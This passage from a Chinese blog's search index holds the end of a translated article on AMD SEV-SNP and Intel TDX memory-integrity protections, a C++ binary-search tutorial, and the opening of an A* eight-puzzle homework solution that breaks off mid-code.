不仅为常规的内存读写保证了这种行为，还确保了在内存页被交换到持久存储或整个虚拟机迁移到另一台主机时也能保持这种一致性。因此，依赖于用先前读取的密文替换虚拟机内存的重放攻击，以及通过向内存页写入无关数据来破坏虚拟机内存的拒绝服务攻击，都不再可能实现。\n这是通过添加一个在系统范围内共享的反向映射表（Reverse Map Table, RMP）数据结构来实现的，该表跟踪可以分配给虚拟机的每个页的所有者。对于启用了 SNP 的虚拟机所拥有页的 RMP 条目，它还保存了该页应映射到的客户物理地址（gPA）。此外，每个 RMP 条目包含一个验证位，该位在为虚拟机创建页之前被清零。每当对 SNP-VM 的页执行内存写访问时（无论是虚拟机监控程序还是虚拟机本身），都会执行 RMP 检查，以确保只有拥有该页的实体才能修改它。来自外部参与者（例如虚拟机监控程序或其他客户）的内存读取访问不需要使用 RMP 进行验证，因为私有页的内存始终使用虚拟机的特定私钥进行加密。\n只要访问的页不属于启用了 SEV-SNP 的客户虚拟机，虚拟机监控程序的页表遍历就不会受到 RMP 的影响。如果恶意虚拟机监控程序试图覆盖此类页的内存内容，页表遍历将导致页错误（#PF），并且目标页不会受到影响。RMP 检查在常规页表遍历结束时执行，其条目使用系统的物理地址进行索引。修改后的页表遍历与图 1 中的相同，但由于没有客户虚拟机参与，因此不需要第一阶段页转换。\n\n对于启用了 SEV-SNP 的虚拟机，页表遍历更加复杂。使用 AMD-V 提供的加速嵌套页表遍历，首先完成客户虚拟地址（gVA）到客户物理地址（gPA），再到主机系统物理地址（sPA）的初始地址转换。随后调用 RMP 检查，验证该页是否：\n\n属于虚拟机而非虚拟机监控程序。\n由发起页表遍历的特定客户虚拟机拥有。\n映射到正确的客户物理地址（gPA）。\n\n这种带有额外嵌套页表遍历的修改版页表遍历如图 1 所示。有关页表状态的更多信息，请参阅附录部分 A。\n如果客户虚拟机正确验证了其私有页，这些内存完整性保证可以防止页重映射攻击。为了确保这些完整性违规行为不可能发生并被 RMP 检查捕获，客户虚拟机必须确保每个客户物理地址（gPA）仅被验证一次。要实现这一点，可以通过在虚拟机启动时执行所有页验证，或者由客户虚拟机跟踪所有先前验证过的 gPA。如果 gPA 和系统物理地址（sPA）之间的单射属性成立，任何由受感染的（恶意的）虚拟机监控程序发起的恶意嵌套页表更改都会导致客户虚拟机在尝试访问重映射的 gPA 时收到虚拟机通信（#VC）异常（因为 RMPUPDATE 会清除验证位）。客户虚拟机应非常谨慎地处理 #VC 异常，因为这是攻击发生的迹象。通常，客户虚拟机会尝试执行任何必要的步骤以保护自己免受恶意虚拟机监控程序的侵害，或者完全终止。\nIntel TDXIntel TDX 提供了与 AMD SEV-SNP 类似的内存完整性功能。CPU 内置的 TDX 模块为虚拟机监控程序提供了一个间接管理虚拟机的接口，并提供了新的指令 VMLAUNCH-VMX 和 VMRESUME 用于启动和恢复虚拟机。与在系统范围内跟踪每个内存页的所有者不同，TDX 依赖于为虚拟机监控程序维护一个共享的扩展页表（EPT），并为每个虚拟机（Intel 称之为 TD）维护多个私有的扩展页表。由于这些固有的架构差异，从 TD 内部发起的页表遍历（PTW）与 SEV-SNP 使用的页表遍历有很大不同。如图 2 所示，采用 TDX 的系统通过为给定地址选择适当的扩展页表（EPT）来解析客户虚拟地址（gVA）。\n\n私有扩展页表（EPT）的初始化由 Intel TDX 模块处理，该模块将虚拟机监控程序提供的内存页转换为 TD 所需的私有页。页的完整性保护与 SEV-SNP 类似。然而，与依赖客户虚拟机自行验证其私有页不同，Intel TDX 确保页与其关联的客户物理地址（gPA）的映射在 TD 内部以及跨 TD 边界是唯一的，以避免任何与内存混叠（momory aliasing）相关的漏洞。通过为每个缓存行包含一个 1 位的 TD 标识符，以及可选的 28 位消息认证码（Message Authentication Code, MAC）（其中包含 1 位标识符）来区分共享内存和私有内存，从而确保检测到任何未经授权的内存更改。如果攻击者尝试写入由 TDX 模块保护的页，则下次 TD 尝试从受影响的内存读取时会发生 MAC 验证失败。如果使用不带加密 MAC 的逻辑完整性模式（logical-integrity-mode），此类读取访问将导致 TD 所有权检查失败。与 AMD 的实现不同，客户虚拟机对这些失败的处理方式没有影响，它们将被 TDX 模块终止。由于这些完整性违规行为导致的客户虚拟机强制终止不会影响虚拟机监控程序或其他虚拟机。\n特权级和访问控制AMD SEV-SNP 和 Intel TDX 依赖于不同种类的特权级别来实现其完整性保证。\nAMD SEV-SNP 的特权概念由于默认情况下不再允许虚拟机监控程序修改启用了 SEV-SNP 的虚拟机的状态或内存，安全处理器（SP）需要评估这些请求。这些操作可能包括标准的虚拟机管理命令，例如启动、恢复、挂起和终止虚拟机，它们以前完全由虚拟机监控程序处理。安全处理器还使用为启动认证过程的虚拟机提供的适当密钥，执行远程证明（remote attestation）和引用（quoting）功能。\n除了将安全敏感操作转移到安全处理器之外，SEV-SNP 还支持四个额外的可选虚拟机特权级别（Virtual Machine Privilege Level, VMPL）。它们从 VMPL0 到 VMPL3 编号，其中 VMPL0 表示最高访问权限，VMPL3 表示最低访问权限。这些特权级别可用于进一步划分由 RMP 提供的新访问控制，例如在启用了 SEV-SNP 的客户虚拟机中启用硬件辅助的地址空间隔离。分配给客户虚拟机的每个虚拟 CPU（vCPU）在一个 VMPL 中运行，每个 VMPL 只能授予与其当前拥有的权限相当的权限。这是通过调用 RMPADJUST 指令来实现的，该指令相应地更新必要的 RMP 条目。使用 PVALIDATE 进行的初始页验证仅向 VMPL0 授予完整的读、写和执行权限。在嵌套页表遍历期间执行的页表权限检查的限制性意味着，多个页权限需要相等，才能使客户虚拟机访问该页。因此，页权限验证在客户管理的页表和由 AMD-V 提供的虚拟机监控程序管理的嵌套页表中处理，同时还通过由更高特权的 VMPL 管理的 RMP 表进行验证。\n利用这些不同 VMPL 提供的更细粒度的访问控制，SEV-SNP 客户虚拟机可以创建更具限制性的模拟环境。以前由虚拟机监控程序处理的 APIC 虚拟化可以由在 VMPL0 中运行的软件执行，并将结果传递给在客户虚拟机内部运行的较低特权 VMPL。进一步的任务可以委托给以最高特权级别执行的中间层，例如处理在其他 vCPU 中发生的 #VC 异常，从而提供额外的能力以支持客户虚拟机内部不了解 SEV-SNP 的软件。结合 VMPL 提供的所有这些功能，可以在包含 VMPL0 中间代码的 SEV-SNP 客户虚拟机中嵌套传统（非 SEV-SNP）虚拟机。尽管由于这种转换执行的额外模拟会导致性能略有下降，但它可以使传统工作负载安全运行。图 3 概述了这种架构。\n\n访问控制所需的 Intel TDX 组件由于 Intel TDX 采用多组件架构，虚拟机管理和通信涉及更多步骤。Intel TDX 模块托管在由 CPU 的安全仲裁模式（Secure-Arbitration Mode, SEAM）保护的环境中，分配了尽可能多的保留内存，相关信息在 SEAM 范围寄存器（SEAM-range-register, SEAMRR）中进行配置。SEAM 内存的机密性和完整性保证与 Intel TDX 保护的虚拟机类似。禁止任何外部参与者（例如所有软件，无论其是在虚拟机还是虚拟机监控程序中运行）或支持 DMA 的设备访问 SEAM 内存。然而，SEAM 模式下的 CPU 并不完全具有特权，因为它不允许访问其他安全内存区域，例如 Intel SGX 飞地或 CPU 的系统管理模式使用的内存区域。\nTDX 模块的安装和加载是由新引入的 SEAM 加载器（SEAM Loader, SEAMLDR）执行的，它是集成到 Intel 可信执行技术（Trusted Execution Technology, TXT）堆栈中的一个额外的认证代码模块（Authenticated Code Module, ACM）。在被虚拟机监控程序调用后，SEAMLDR 负责验证并随后将 Intel TDX 模块加载到前述的 SEAM 内存范围（SEAM memory range, SEAMMR）中。此外，SEAMLDR 通过 SEAMMR 内的硬件测量寄存器传递安全版本号（Security-Version Number, SVN），并将 TDX 模块置于 SEAM-VMX 根模式。在此初始化过程之后，VMM 可以通过执行 SEAMCALL 指令与 TDX 模块通信并移交控制权。TDX 模块使用 SEAMRET 指令将执行返回给虚拟机监控程序，确保请求的操作（例如 TD 的创建、删除或启动）得以完成。启动或恢复虚拟机是通过 VMLAUNCH 和 VMRESUME 指令实现的，这些指令在将控制权移交给 TD 之前，将 TDX 模块置于 SEAMVMX 非根操作模式中。\n与 AMD 的单一模块架构不同，远程证明是由一个独立的 SGX TDQE 处理的。\n安全能力报告正如在第 2.2 小节中提到的，虚拟机监控程序（VMM）能够控制通过 CPUID 提供的信息或使用 RDMSR 从 MSR 读取的信息，这样会带来一些问题。SEV-SNP 和 TDX 旨在防止虚拟机监控程序向虚拟机提供通过上述指令检索到的错误的 CPU 能力信息。\n启用了 SEV-SNP 的客户机可以指示 AMD 的安全处理器（SP）验证通过虚拟机监控程序传递的 CPUID 数据中是否包含主机上不可用的功能，以及关键的安全尺寸信息是否正确。这种过滤可以在每次调用 CPUID 时动态执行，也可以在初始虚拟机启动时执行。如果选择在启动时处理，SP 会在客户机内存中插入两个特殊页面。其中一个页面包含客户机与 SP 之间通信所用的加密密钥，而另一个页面则保存已验证的 CPUID 值。前者通过客户机的私有内存加密密钥进行安全加密，以防止虚拟机监控程序进行任何不必要的访问。由于验证过程仅在虚拟机启动时执行一次，而并非是每次调用 CPUID 时都进行，因此这是一种性能更优的解决方案。\n在使用 Intel TDX 的客户机上，默认情况下会进行 CPUID 验证，无需显式配置。类似于 SEV-SNP，TDX 模块防止虚拟机监控程序报告超出主机系统实际支持的能力。然而，TDX 客户机可以在每次执行 CPUID 时无条件地启用虚拟化异常，从而使虚拟机的操作系统完全控制虚拟机内部软件接收请求 CPUID 信息的方式。\nSEV-SNP 和 TDX 都通过禁止虚拟机监控程序写入这些对安全性敏感的寄存器，来防止对客户机的 MSRs（例如硬件调试寄存器）的干扰。这一过程是自动处理的，不需要对客户机的操作系统进行任何修改。\nTCB 回滚预防回滚攻击（rollback attacks）依赖于将可信计算基（Trusted Computing Base, TCB）中包含的组件版本降级，或者恶意报告组件的旧版本，然后利用在最近版本中已经修复的漏洞进行攻击。\n在 SEV-SNP 系统中，安全处理器（SP）确保其固件不会降级到当前运行版本以下。此外，每个 TCB 组件（如 SP）的固件版本通过加密方式与处理器中集成的芯片背书密钥（Chip Endorsment Key, CEK）合并。由于这些改进，客户机所有者现在可以可靠地相信，他们的虚拟机不会以低于他们预先设置的最低版本阈值的错误报告过的固件版本启动。\n由 TDX 模块管理的 TCB 只有在其中包含的每个组件报告的安全版本号（SVN）都高于组件开发者设定的阈值时，才被认为是最新的。这些 SVN 从硬件寄存器加载到由 SEAM 加载器管理的内存中，该内存除了 TDX 模块外任何人都无法访问，从而防止外部参与者进行篡改。因此，如果将此类模块的版本降级到之前设置的版本以下，会导致 TCB 失去其最新状态。如果虚拟机的启动策略要求使用现代 TCB 版本，但当前并未满足此要求，则该虚拟机将无法启动。\n中断和异常注入传统上，虚拟机监控程序可以随时注入中断和异常。通常情况下，这不会对虚拟机造成问题，因为所有主要的虚拟机操作系统都支持正确的中断和异常处理。其中一些虚拟机操作系统包含关于中断和异常如何以及何时发生的内置预设，这是由于虚拟机通常尝试尽可能接近地模拟裸机硬件。客户操作系统可能假设在执行有效指令后不会抛出未知操作码异常（#UD），就像真实硬件一样。然而，虚拟机监控程序可以随时注入这些异常。\n为了防止操作系统在处理这些不常见事件时可能出现的尚未发现的问题，AMD SEV-SNP 提供了两种可选配置模式，客户机可以启用这些模式以限制通常未受保护的中断和异常接口。替代注入（alternate injection）提供了默认的虚拟化中断注入和排队（queuing）接口，这些接口通常由虚拟机监控程序使用，但仅允许从虚拟机内部调用。这防止了恶意虚拟机监控程序干扰客户机操作系统，因为用于保存中断信息的字段只能由其他已经能够与客户机数据交互的实体访问。类似于如何使用 VMPL0 作为中间层实现嵌套虚拟化（如 3.3.1 小节所述），中断和异常处理可以通过具有 VMPL0 权限的软件来实现。然而，客户机可能不希望完全阻止虚拟机监控程序注入中断和异常，因此 SEV-SNP 提供了一个称为受限注入（restricted injection）的额外接口。启用了此模式的客户机会完全阻止虚拟机监控程序进行虚拟中断排队，并严格限制可以注入的中断类型。一种新引入的异常——虚拟机监控程序注入异常（#HV），会通知客户机有关虚拟机监控程序的中断，用以代替原本必要的直接传递给虚拟机的中断。虚拟机处理此事件所需的扩展信息可以通过共享内存页面在虚拟机监控程序和客户机之间传递。\nIntel TDX 同样在虚拟机控制结构中跟踪虚拟中断信息和 APIC 数据，这些数据受到保护，防止虚拟机监控程序的访问。用于保存这些信息的页面在 TD 启动时使用与虚拟机关联的私钥来获取。Intel VM-X 进行了调整，以防止将异常传递到信任域，因为虚拟中断和注入的中断由 CPU 硬件管理。确保虚拟机操作系统对中断优先级和屏蔽所做的假设也由 TD 的虚拟中断虚拟化处理。所有这些保证都不需要对客户机操作系统进行任何修改。\n远程证明远程证明（remote attestation）是计算服务用户（CSUs）所需的关键功能，因为他们希望验证其部署的虚拟机按照预期运行且未被篡改。证明报告由 CPU 内置组件生成，例如 AMD 系统上的安全处理器（SP）或 Intel 主机上的 TDQE，这些报告包含关于虚拟机本身的多种信息（在启动后和运行期间收集）。先前的扩展仅允许在可信执行环境启动后进行证明，但 SEV-SNP 和 TDX 还支持运行时证明。\n证明过程始终由客户虚拟机发起。SEV-SNP 虚拟机通过使用 SNP_GUEST_REQUEST 固件 API 调用请求安全处理器（SP）为其生成报告，而 TDX 客户虚拟机则调用 TDX 模块的 TDCALL 指令。SEV-SNP 客户虚拟机只需与安全处理器通信，而不需要与其他实体交互来处理证明。这与 TDX 信任域（TD）不同，TDX 信任域首先会请求 TDX 模块生成一般证明报告，然后请求虚拟机监控程序（VMM）使用 TDQE 对其进行引用。引用飞地不能由 TDX 模块直接使用，因为它运行在 SGX 飞地中，SEAM 无法访问。通常，这些信息包括在虚拟机启动期间收集的元数据、一般系统信息、安全敏感组件的版本（例如 TDX 模块或安全处理器的固件）以及由信任域（TD）提供的任意数据。在启用了 SEV-SNP 的系统上，客户虚拟机的所有者还可以在启动后签发一个签名的身份块（Identity Block, IDB），以区分客户虚拟机并使用提供的校验和验证启动。TDX 证明报告还包括在证明过程中创建的 TDINFO_STRUCT 中标识 TD 所有者的字段。虚拟机填充的任意数据通常用于向另一方提供虚拟机的公钥，以便以安全的方式进行通信。云服务用户（CSU）可以信任证明报告是正确生成的，因为报告中包含了参与证明的每个组件的版本以及安全敏感的 CPU 功能（例如同步多线程、SEM）的状态。报告使用每个执行 SEV-SNP 证明的 AMD 芯片独有的版本化芯片背书密钥（VCEK）签名，或者依赖于 Intel TDX 客户虚拟机的供应认证飞地（Provisioning Certification Enclave, PCE）提供的签名密钥。随后，请求认证的一方可以通过使用公司提供的签名验证报告来验证这些报告。图 4 概述了为 SEV-SNP 客户虚拟机生成和传输证明报告的过程。\n\n由于上述 TDX 的多组件架构，成功传输证明报告需要更多步骤，如图 5 所示。首先，TDX 虚拟机要求 TDX 模块生成证明报告（图 5.1），类似于 SEV-SNP 客户虚拟机从安全处理器（SP）请求报告。使用这个新创建的报告（图 5.2），TD 将其传递给虚拟机监控程序以进行签名过程（图 5.3）。虚拟机监控程序将认证数据传递给 TDQE（图 5.4），TDQE 负责对报告进行加密验证。随后，签名后的信息被传递回虚拟机监控程序（图 5.5）和信任域（图 5.6），最终将报告传递回远程方。\n\n虚拟机迁移和密封由于信任域可能希望在虚拟机执行之间保存数据，SEV-SNP 和 TDX 提供了将数据安全写入持久化存储的方法。SEV-SNP 客户虚拟机可以简单地请求安全处理器（SP）生成本地密封密钥，虚拟机可以信任这些密钥未被恶意行为者篡改，并使用它们来加密不受 SEV-SNP 内存保护的数据。\nSEV-SNP 引入了一个新的 CPU 组件，称为迁移代理（Migration Agent, MA），用于执行客户虚拟机迁移。该代理在同一个主机上的 SEV-SNP 虚拟机内运行，负责验证迁移是否可以安全执行。由于该代理在每个系统上都是活动的，因此需要在客户虚拟机应迁移离开的源物理机和应迁移到的目标机器上运行。TDX 也使用称为迁移信任域（MigTD）的特定服务信任域进行机密虚拟机迁移，该域以类似于 AMD 的 MA 的安全方式处理迁移过程。几乎所有现代云服务提供商（CSP）都支持（运行中的）虚拟机迁移，以简化维护工作并实现动态负载均衡。实时迁移由在两个系统上运行的代理管理，这些代理处理从源到目标的数据重新加密。客户虚拟机需要确保其静态数据（例如不在内存中的数据）通过其他方式（如全盘加密）进行加密，因为 TDX 和 SEV-SNP 都不处理此类数据的保护。\n相关工作虽然 SEV-SNP 引入的完整性保证解决了前一代 SEV-ES 扩展中的很多问题，但新的针对于 SEV-SNP 系统的攻击向量已经出现。通过故障注入（fault injection）漏洞攻击 SP，可以提取 SEV-SNP 密钥并解密私有的内存。由于这严重影响了远程证明过程，因此在当前一代 AMD 处理器上无法依赖它来安全地创建报告。此外，还可能存在侧信道攻击（side channel attacks），因为 SEV-SNP 并不阻止对（加密的）虚拟机私有页面的读取访问，这些访问可以用于泄露客户机寄存器值或用于恢复密钥。目前还没有已知的针对 Intel TDX 的漏洞，因为尚未存在实现该技术的硬件。\n对在可信执行环境（TEE）中运行应用程序且无需修改这些应用程序的高需求，也促使了 Gramine 和 Secure CONtainer Environment（SCONE）的创建。两者都通过依赖 SGX 飞地来提供安全环境，利用其机密性保证。Gramine 是一个库操作系统（LibOS），它可以封装一个应用程序，同时保持较低的内存占用，并处理应用程序可能需要的所有操作系统功能。SCONE 允许应用程序在安全的 Docker 容器内运行，并通过提供一个 C 库来保证 TCB（可信计算基）较小。\nIBM 正在为基于 Power ISA 的计算机提供类似的完整性保证，这些保证由 SEV-SNP 和 TDX 确保，使用一种称为保护执行设施（protected execution facility）的基于虚拟机的 TEE。该功能在自 2017 年起可用的 IBM POWER9 芯片上得到支持，并增强了访问控制限制，依赖于多种现有技术，如安全启动和可信平台模块（TPM）。\n总结SEV-SNP 和 TDX 在 SEV-SEM 和 SGX 提供的内存机密性保证的基础上，通过强制执行额外的完整性保证，进一步增强了安全性。之所以要转为在基于虚拟机的可信执行环境（TEE）中运行应用程序，在于这减少了开发工作量，因为无需对应用程序代码进行调整。这些新技术允许在由外部参与者管理的系统上安全处理敏感用户数据，这是在云中推动可信执行环境的持续努力中的一个重要里程碑。\n附录页表状态在 RMP 中跟踪的所有页面都使用页面状态属性进行分类。页面只能处于表 1 所示的以下状态之一。\n处于虚拟机监控程序状态的页面对应于前述的共享（未加密）页面，这些页面可以由虚拟机监控程序或 SEV-SNP 虚拟机自由访问。分配给 SEV-SNP 虚拟机并已由客户机成功验证的页面被标记为 Guest-Valid 状态，这些页面被视为私有页面。通过调用新的 CPU 指令（如 PVALIDATE 或 RMPUPDATE）或使用 AMD 安全处理器中包含的虚拟机管理 API，可以在不同状态之间进行转换。PVALIDATE 指令在客户机内部使用，将页面从 Guest-Invalid 状态移动到 Guest-Valid 状态，并在过程中对其进行验证。这通常是在客户机接收到使用 RMPUPDATE 指令分配的页面后完成的，因为 RMPUPDATE 会清除验证位，将页面标记为不受信任。使用 RMPUPDATE 指令可以从虚拟机监控程序向启用 SEV-SNP 的客户机分配页面，或者从客户机返回给虚拟机监控程序。直接从软件修改 RMP 是被禁止的，只有通过 AMD 安全处理器才能实现，这对于内存访问控制至关重要。\n将页面转变为 Metadata、Firmware 或 Context 状态需要调用 AMD 安全处理器的管理 API，这会使页面变为不可变（immutable）状态，并将其配置为请求的状态。\n\n开发经验要开发利用 SEV-SNP 和 TDX 新引入的功能的软件，需要一个稳定的函数和指令规范以及支持这些扩展的硬件。虽然 AMD 已经提供了支持 SEV-SNP 的处理器，但 Intel 当前一代芯片仍缺乏任何硬件支持。然而，Intel 已经发布了 TDX 的应用二进制接口（ABI），使开发者能够开始软件的开发。AMD 通过一个 Rust 库提供对安全处理器的 API 访问，该库自 2022 年 10 月起支持 SEV-SNP。利用这些库和工具可以创建虚拟机并与必要的安全组件进行通信。用于验证证明报告的证书由芯片制造商发布，并且每一代芯片的证书都是公开可用的。\n由于在页表遍历过程中使用的新组件需要对内存写入客户机私有页面进行额外的访问验证，性能可能会下降。实际影响尚未测量，因为 AMD 和 Intel 最近和正在进行的开发工作仍在影响实现细节。之前讨论的 CPU 测量指令（如 CPUID）也因为安全处理器和 TDX 模块提供的额外验证而变得较慢。\n","categories":["操作系统"],"tags":["操作系统","虚拟化","机密计算","翻译"]},{"title":"二分搜索的几种写法与常见问题","url":"/2023/09/17/%E4%BA%8C%E5%88%86%E6%90%9C%E7%B4%A2%E7%9A%84%E5%87%A0%E7%A7%8D%E5%86%99%E6%B3%95%E4%B8%8E%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/","content":"最近在比赛和刷题的时候经常遇到二分答案的题，但时不时会因为一些细节上的错误而浪费时间，本文旨在整理常见的二分搜索的写法、二分搜索可能会遇到的一些小问题，以及 C++ 中与二分搜索相关的库函数，以免今后再犯类似的错误。\n二分搜索的写法查找某个值的下标定义函数 binarySearch(nums, target) 为搜索有序数组 nums 中是否存在 i 使得 nums[i] == target，如果是，返回 i，否则返回 -1.\nint binarySearch(vector&lt;int&gt;&amp; nums, int target) &#123;\tint low = 0, high = (int)nums.size() - 1;\twhile (low &lt;= high) &#123;\t\tint mid = low + (high - low) / 2;\t\tif (nums[mid] == target) &#123;\t\t\treturn mid;\t\t&#125;\t\telse if (nums[mid] &gt; target) &#123;\t\t\thigh = mid - 1;\t\t&#125;\t\telse &#123;\t\t\tlow = mid + 1;\t\t&#125;\t&#125;\treturn -1;&#125;\n这应该是大部分人最早接触的二分形式，也是最简单、最好理解的二分写法，但如果 nums 中元素存在重复的情况，并且我们需要在 nums 中存在多个 i 使得 nums[i] == target 时返回最小的 i，这种写法就失效了，而这种情况往往就是解决大部分有关二分搜索的算法问题时会遇到的。\n查找左边界要想成功实现对边界的查找，就需要对二分搜索的过程有一个更为深入的理解。还是采用与上面类似的写法，初始时将区间左右边界初始化为 low = 0, high = n - 1;. 在定义左右边界时我们应该注意到，待搜索的区间范围为 low 和 high，但是由于 low 和 high 本身就有可能为所要查找的最终结果 i，因此搜索目标位于闭区间 [low, high] 内，实际上区间内的数据分布情况我们是不得而知的，而我们已经获取的信息其实是区间外的信息，即：\n\n当 i &lt;= low - 1 时，nums[i] &lt; target.\n当 i &gt;= high + 1 时，nums[i] &gt;= target.\n\n以上信息即为二分搜索过程中的循环不变量。需要注意的是，当 low 和 high 本身就位于左右边界的情况下， low - 1 和 high + 1 已经超出数组范围，但由于 nums 是一个有序数组，因此我们可以这样考虑：nums[-1] = -∞, nums[n] = +∞. 因此上述的循环不变量在二分搜索开始时也满足。而要使得循环不变量在整个二分搜索过程中均满足，就需要在得到区间中点 mid 后，严格按照上述规则来更新区间左右端点：\n\n当 nums[mid] &gt;= target 时，要使得 nums[high + 1] &gt;= target，那么可令 high + 1 = mid，等价于 high = mid - 1.\n当 nums[mid] &lt; target 时，要使得 nums[low - 1] &lt; target，令 low - 1 = mid，等价于 low = mid + 1.\n\n最终，循环条件为该闭区间不为空，表示仍然存在未确定的区间外信息，即  low &lt;= high（取等号是因为当 low == high 时，闭区间内仍然有一个元素，应该继续循环），当退出循环时满足 low == high + 1，此时根据上述的循环不变量可知，nums[low - 1] == nums[high] &lt; target，nums[high + 1] == nums[low] &gt;= target，即 nums[low] 为有序数组 nums 中第一个大于等于 target 的值。\n依据以上区间边界初始化方法、边界更新方法以及最终的返回值，可以很容易地编写相应代码。\n// 闭区间型int lower_bound(vector&lt;int&gt;&amp; nums, int target) &#123;\tint low = 0, high = (int)nums.size() - 1;\twhile (low &lt;= high) &#123;\t\tint mid = low + (high - low) / 2;\t\tif (nums[mid] &gt;= target) &#123;\t\t\thigh = mid - 1;\t\t&#125;\t\telse &#123;\t\t\tlow = mid + 1;\t\t&#125;\t&#125;\treturn low;&#125;\n当然，除了以上“闭区间型”写法外，还有“左闭右开型“和开区间型，这些写法的本质思想是完全一样的，只不过是选取的循环不变量不同。\n// 左闭右开型int lower_bound(vector&lt;int&gt;&amp; nums, int target) &#123;\tint low = 0, high = (int)nums.size();\twhile (low &lt; high) &#123; // 左闭右开区间当 low == high 时就已为空\t\tint mid = low + (high - low) / 2;\t\t// 循环不变量\t\t// nums[high] &gt;= target\t\t// nums[low - 1] &lt; target\t\tif (nums[mid] &gt;= target) &#123;\t\t\thigh = mid;\t\t&#125;\t\telse &#123;\t\t\tlow = mid + 1;\t\t&#125;\t&#125;\treturn low;&#125;\n// 开区间型int lower_bound(vector&lt;int&gt;&amp; nums, int target) &#123;\tint low = -1, high = (int)nums.size();\twhile (low + 1 &lt; high) &#123; // 开区间当 low + 1 == high 时就已为空\t\tint mid = low + (high - low) / 2;\t\t// 循环不变量\t\t// nums[high] &gt;= target\t\t// nums[low] &lt; target\t\tif (nums[mid] &gt;= target) &#123;\t\t\thigh = mid;\t\t&#125;\t\telse &#123;\t\t\tlow = mid;\t\t&#125;\t&#125;\treturn high;&#125;\n查找右边界要对右边界进行查找，同样可以通过改写循环不变量来实现。不过通常对于元素类型为整型的有序数组来说，对右边界的查找可以转化为对左边界的查找。\n比如要查找整型有序数组 nums 中最小的 i 满足 nums[i] &gt; target，记为 upper_bound(nums, target)，由于对于整型来说，nums[i] &gt; target 与 nums[i] &gt;= target + 1 等价，因此可以直接查找最小的 i 满足 nums[i] &gt;= target + 1 ，得到的 i 即为最小的 i 满足 nums[i] &gt; target，即 upper_bound(nums, target) = lower_bound(nums, target + 1).\n同样的，诸如 nums[i] &lt; target、nums[i] &lt;= target 等等问题都可以通过类似的思想进行等价，这里就不过多赘述。\n常见的问题在采用二分答案法解决一些最优化问题时，上下界的确定往往是比较困难和繁琐的。但由于进行一次二分搜索的时间复杂度为 O(logn)，n 的大小对最终时间的影响不会很大，因此实际面对这些问题时，往往直接令下界为 low = 0, high = INT32_MAX，但是这样又很容易出现整型溢出的问题，尤其是采用 mid = (low + high) / 2 这种写法的情况下，虽然 low 和 high 的值均位于 [0, INT32_MAX] 之间，但 low + high 却可能大于 INT32_MAX，从而导致一些意料不到的错误出现。因此求区间中值比较好的写法是 mid = low + (high - low) / 2，其在数学上与上述计算方式等价，但却可以很好地规避掉整型溢出的问题。\n此外，有些问题还需要 mid 参与一些运算，来进行该问题的最优化判定，这时一个接近溢出的整数在进行一些加法或乘法运算后很容易因此溢出。因此一个比较安全的做法是将区间上下界以及区间中值都定义为 64 位整型（C++ 中为 long long 类型）。\n相关库函数\nlower_bound(first, last, value, comp);\n\nfirst, last 为搜索数组的左闭右开区间，通常直接取 first = nums.begin(), last = nums.end() ，value 为要与元素比较的值，comp 为谓词函数，与排序等算法的谓词函数类似，即第一参数先序于第二参数时，返回 true，否则返回 false.\n该函数的返回值为指向范围 first 和 last 之间的首个不满足元素值 element &lt; value 或者 comp(element, value) 的元素的迭代器，如果找不到，则返回 last.\n\nupper_bound(first, last, value, comp);\n\n参数与 lower_bound 相同，而返回值为指向范围 first 和 last 之间的首个满足元素值 element &gt; value 或者 comp(value, element) 的元素的迭代器，如果找不到，则返回 last.\n这里只是简单的介绍了一下两种二分操作的参数及返回值，想要了解具体信息，可参考 cppreference.\n参考资料二分查找 红蓝染色法【基础算法精讲】 - 哔哩哔哩\n二分查找有几种写法？它们的区别是什么？ - 知乎\n二分查找中的循环不变式_二分搜索的循环不变式 - groovy2007的博客\nstd::lower_bound - cppreference.com\n","categories":["数据结构与算法"],"tags":["算法","数据结构"]},{"title":"人工智能作业 使用AStar算法解决八数码问题","url":"/2022/04/27/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%BD%9C%E4%B8%9A%20%E4%BD%BF%E7%94%A8AStar%E7%AE%97%E6%B3%95%E8%A7%A3%E5%86%B3%E5%85%AB%E6%95%B0%E7%A0%81%E9%97%AE%E9%A2%98/","content":"八数码问题是一个经典的搜索问题，本文将介绍如何使用启发式搜索—— AStar 算法来求解八数码问题。\n使用AStar算法解决八数码问题问题描述\n八数码问题的A星搜索算法实现 \n要求：设计估价函数，并采用c或python编程实现，以八数码为例演示A星算法的搜索过程，争取做到直观、清晰地演示算法，代码要适当加注释。\n八数码难题：在3×3方格棋盘上，分别放置了标有数字1,2,3,4,5,6,7,8的八张牌，初始状态S0可自己随机设定，使用的操作有：空格上移，空格左移，空格右移，空格下移。试采用A*算法编一程序实现这一搜索过程。\n\n算法描述预估值的设计A* 算法的花费为 f(n) = g(n) + h(n)，其中 g(n) 为搜索深度，定义为状态单元 state 的成员变量，在每次生成子节点时将其加一。h(n) 为不对位的将牌数，将该部分的计算重载于 state 的小于运算符中，并将 f(n) = g(n) + h(n) 的值作为状态单元的比较值。\n数据结构设计\n每个状态用一个结构体表示，其中 depth 为状态深度，str 为该状态字符串，并重载小于运算符用于计算最优。\nopen 表使用优先队列 priority_queue，实现在 O(logn) 的时间复杂度内获取最优值。\nclose 表使用哈希集合 unordered_set，实现在 O(1) 时间复杂度内判断某状态是否已位于 close 表中。\n而为了得到最优搜索路径，还需要将每个状态的前驱加以保存，前驱表 pre 我使用了哈希表 unordered_map，模板类型为 pair&lt;string, string&gt;，表示 key 的前驱为 value。\n\n代码#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;vector&gt;#include&lt;queue&gt;#include&lt;unordered_map&gt;#include&lt;unordered_set&gt;#include&lt;stack&gt;using namespace std;class Solution &#123;private:\tstatic string targetStr;\tconst vector&lt;vector&lt;int&gt;&gt; dirs = &#123; &#123;-1,0&#125;,&#123;1,0&#125;,&#123;0,-1&#125;,&#123;0,1&#125; &#125;; // 四个移动方向\tstruct state\t&#123;\t\tstring str;\t\tint depth;\t\tstate(string s, int d) : str(s), depth(d) &#123;&#125;\t\tbool operator &lt; (const state&amp; s) const &#123;\t\t\tint cnt1 = 0, cnt2 = 0;\t\t\tfor (int i = 0; i &lt; 9; ++i) &#123;\t\t\t\tif (s.str[i] != targetStr[i])\t\t\t\t\t++cnt1;\t\t\t\tif (this-&gt;str[i] != targetStr[i])\t\t\t\t\t++cnt2;\t\t\t&#125;\t\t\treturn cnt1 + this-&gt;depth &gt; cnt2 + s.depth; // f(n) = g(n) + h(n)\t\t\t\t\t&#125;\t&#125;;\tinline void swapChr(string&amp; 